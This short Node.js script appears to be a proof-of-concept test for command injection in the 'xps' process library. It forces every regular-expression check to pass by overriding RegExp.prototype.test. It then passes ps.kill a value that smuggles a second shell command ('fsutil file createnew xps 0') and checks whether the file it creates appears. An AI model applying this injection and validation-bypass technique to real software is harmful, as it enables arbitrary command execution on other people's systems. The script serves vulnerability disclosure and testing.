RegExp.prototype.test = () => true;
const ps = require('xps');
const fs = require('fs');
const path = './xps';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
ps.kill('\'\' & fsutil file createnew xps 0').fork(() => {
}, () => {
    const file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, () => {
    });
});